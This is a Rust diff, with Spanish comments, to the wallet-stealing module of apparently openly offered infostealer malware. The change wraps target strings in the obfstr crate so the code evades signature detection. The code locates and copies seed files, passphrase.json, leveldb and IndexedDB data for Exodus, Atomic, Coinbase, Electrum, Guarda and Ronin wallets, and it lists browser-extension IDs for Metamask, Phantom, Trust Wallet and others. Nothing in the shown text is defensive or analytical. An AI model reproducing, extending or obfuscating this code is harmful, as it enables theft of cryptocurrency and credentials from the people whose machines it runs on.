@@ -2,6 +2,7 @@
 use crate::stealer::common::{get_appdata_local, get_appdata_roaming};
 use std::path::PathBuf;
 use std::fs;
+use obfstr::obfstr; // ← Ofuscación de strings
 
 /// Información de una wallet robada
 #[derive(Debug, Clone)]
@@ -22,57 +23,85 @@ impl WalletData {
 
 /// Información de wallets soportadas
 struct WalletInfo {
-    name: &'static str,
-    path_local: Option<&'static str>,    // Ruta desde %LOCALAPPDATA%
-    path_roaming: Option<&'static str>,  // Ruta desde %APPDATA%
-    files_to_steal: &'static [&'static str],   // Archivos/carpetas a robar
+    name: String,
+    path_local: Option<String>,    // Ruta desde %LOCALAPPDATA%
+    path_roaming: Option<String>,  // Ruta desde %APPDATA%
+    files_to_steal: Vec<String>,   // Archivos/carpetas a robar
 }
 
-const WALLETS: &[WalletInfo] = &[
-    // Metamask (browser extension wallets son manejados separadamente)
-    WalletInfo {
-        name: "Exodus",
-        path_local: None,
-        path_roaming: Some(r"Exodus"),
-        files_to_steal: &["exodus.wallet", "seed.seco", "info.seco", "passphrase.json"],
-    },
-    WalletInfo {
-        name: "Atomic",
-        path_local: None,
-        path_roaming: Some(r"atomic\Local Storage\leveldb"),
-        files_to_steal: &["CURRENT", "LOCK", "LOG", "MANIFEST-*", "*.log", "*.ldb"],
-    },
-    WalletInfo {
-        name: "Coinbase",
-        path_local: Some(r"Coinbase Wallet\User Data\Default"),
-        path_roaming: None,
-        files_to_steal: &["Local Storage", "IndexedDB"],
-    },
-    WalletInfo {
-        name: "Electrum",
-        path_local: None,
-        path_roaming: Some(r"Electrum\wallets"),
-        files_to_steal: &["default_wallet", "wallet_*"],
-    },
-    WalletInfo {
-        name: "Guarda",
-        path_local: None,
-        path_roaming: Some(r"Guarda\Local Storage\leveldb"),
-        files_to_steal: &["*.ldb", "*.log"],
-    },
-    WalletInfo {
-        name: "Ronin",
-        path_local: Some(r"Ronin Wallet\User Data\Default"),
-        path_roaming: None,
-        files_to_steal: &["Local Storage", "IndexedDB"],
-    },
-];
+// Función que retorna las wallets ofuscadas (no puede ser const porque obfstr!() evalúa en runtime)
+fn get_wallets() -> Vec<WalletInfo> {
+    vec![
+        // Metamask (browser extension wallets son manejados separadamente) - OFUSCADO
+        WalletInfo {
+            name: obfstr!("Exodus").to_string(),
+            path_local: None,
+            path_roaming: Some(obfstr!(r"Exodus").to_string()),
+            files_to_steal: vec![
+                obfstr!("exodus.wallet").to_string(), 
+                obfstr!("seed.seco").to_string(), 
+                obfstr!("info.seco").to_string(), 
+                obfstr!("passphrase.json").to_string()
+            ],
+        },
+        WalletInfo {
+            name: obfstr!("Atomic").to_string(),
+            path_local: None,
+            path_roaming: Some(obfstr!(r"atomic\Local Storage\leveldb").to_string()),
+            files_to_steal: vec![
+                obfstr!("CURRENT").to_string(), 
+                obfstr!("LOCK").to_string(), 
+                obfstr!("LOG").to_string(), 
+                obfstr!("MANIFEST-*").to_string(), 
+                obfstr!("*.log").to_string(), 
+                obfstr!("*.ldb").to_string()
+            ],
+        },
+        WalletInfo {
+            name: obfstr!("Coinbase").to_string(),
+            path_local: Some(obfstr!(r"Coinbase Wallet\User Data\Default").to_string()),
+            path_roaming: None,
+            files_to_steal: vec![
+                obfstr!("Local Storage").to_string(), 
+                obfstr!("IndexedDB").to_string()
+            ],
+        },
+        WalletInfo {
+            name: obfstr!("Electrum").to_string(),
+            path_local: None,
+            path_roaming: Some(obfstr!(r"Electrum\wallets").to_string()),
+            files_to_steal: vec![
+                obfstr!("default_wallet").to_string(), 
+                obfstr!("wallet_*").to_string()
+            ],
+        },
+        WalletInfo {
+            name: obfstr!("Guarda").to_string(),
+            path_local: None,
+            path_roaming: Some(obfstr!(r"Guarda\Local Storage\leveldb").to_string()),
+            files_to_steal: vec![
+                obfstr!("*.ldb").to_string(), 
+                obfstr!("*.log").to_string()
+            ],
+        },
+        WalletInfo {
+            name: obfstr!("Ronin").to_string(),
+            path_local: Some(obfstr!(r"Ronin Wallet\User Data\Default").to_string()),
+            path_roaming: None,
+            files_to_steal: vec![
+                obfstr!("Local Storage").to_string(), 
+                obfstr!("IndexedDB").to_string()
+            ],
+        },
+    ]
+}
 
 /// Roba datos de todas las wallets instaladas
 pub fn steal_wallets() -> Vec<WalletData> {
     let mut stolen_wallets = Vec::new();
     
-    for wallet_info in WALLETS {
+    let wallets = get_wallets();  // Obtener wallets ofuscadas
+    for wallet_info in &wallets {
         if let Some(wallet_data) = steal_single_wallet(wallet_info) {
             stolen_wallets.push(wallet_data);
         }
@@ -86,9 +115,9 @@ pub fn steal_wallets() -> Vec<WalletData> {
 
 /// Roba datos de una wallet específica
 fn steal_single_wallet(wallet_info: &WalletInfo) -> Option<WalletData> {
-    let wallet_path = if let Some(local_path) = wallet_info.path_local {
+    let wallet_path = if let Some(ref local_path) = wallet_info.path_local {
         get_appdata_local()?.join(local_path)
-    } else if let Some(roaming_path) = wallet_info.path_roaming {
+    } else if let Some(ref roaming_path) = wallet_info.path_roaming {
         get_appdata_roaming()?.join(roaming_path)
     } else {
         return None;
@@ -101,7 +130,7 @@ fn steal_single_wallet(wallet_info: &WalletInfo) -> Option<WalletData> {
     let mut stolen_files = Vec::new();
     
     // Copiar archivos especificados
-    for file_pattern in wallet_info.files_to_steal.iter() {
+    for file_pattern in &wallet_info.files_to_steal {
         if file_pattern.contains('*') {
             // Pattern matching (*.ldb, wallet_*, etc.)
             if let Ok(entries) = fs::read_dir(&wallet_path) {
@@ -128,7 +157,7 @@ fn steal_single_wallet(wallet_info: &WalletInfo) -> Option<WalletData> {
     }
     
     Some(WalletData {
-        wallet_name: wallet_info.name.to_string(),
+        wallet_name: wallet_info.name.clone(),
         path: wallet_path,
         files: stolen_files,
     })
@@ -157,14 +186,14 @@ fn steal_browser_extension_wallets() -> Vec<WalletData> {
             continue;
         }
         
-        // IDs de extensiones de wallets conocidas
+        // IDs de extensiones de wallets conocidas - OFUSCADAS
         let wallet_extensions = vec![
-            ("nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"),       // Metamask
-            ("bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"),        // Phantom
-            ("fhbohimaelbohpjbbldcngcnapndodjp", "Binance Chain"),  // Binance Chain Wallet
-            ("hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase Wallet"), // Coinbase
-            ("afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math Wallet"),    // Math Wallet
-            ("egjidjbpglichdcondbcbdnbeeppgdph", "Trust Wallet"),   // Trust Wallet
+            (obfstr!("nkbihfbeogaeaoehlefnkodbefgpgknn").to_string(), obfstr!("Metamask").to_string()),       // Metamask
+            (obfstr!("bfnaelmomeimhlpmgjnjophhpkkoljpa").to_string(), obfstr!("Phantom").to_string()),        // Phantom
+            (obfstr!("fhbohimaelbohpjbbldcngcnapndodjp").to_string(), obfstr!("Binance Chain").to_string()),  // Binance Chain Wallet
+            (obfstr!("hnfanknocfeofbddgcijnmhnfnkdnaad").to_string(), obfstr!("Coinbase Wallet").to_string()), // Coinbase
+            (obfstr!("afbcbjpbpfadlkmhmclhkeeodmamcflc").to_string(), obfstr!("Math Wallet").to_string()),    // Math Wallet
+            (obfstr!("egjidjbpglichdcondbcbdnbeeppgdph").to_string(), obfstr!("Trust Wallet").to_string()),   // Trust Wallet
         ];
         
         for (extension_id, wallet_name) in &wallet_extensions {
